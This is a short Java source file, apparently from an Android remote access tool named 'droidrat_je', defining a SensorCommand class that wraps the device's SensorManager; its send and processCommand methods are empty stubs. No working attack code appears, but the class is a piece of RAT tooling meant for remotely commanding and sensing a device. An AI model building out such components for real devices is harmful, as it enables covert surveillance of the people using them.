package com.je_chen.droidrat_je.command;

import android.hardware.SensorManager;

import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
import com.je_chen.droidrat_je.rat.command.process_super.CommandProcessInterface;

public class SensorCommand extends CommandFather implements CommandProcessInterface {

    private SensorsFather sensors;

    public SensorCommand(SensorManager sensorManager){
        sensors = new SensorsFather(sensorManager);
    }

    @Override
    public void send(String value) {

    }

    @Override
    public void processCommand(String command) {

    }
}
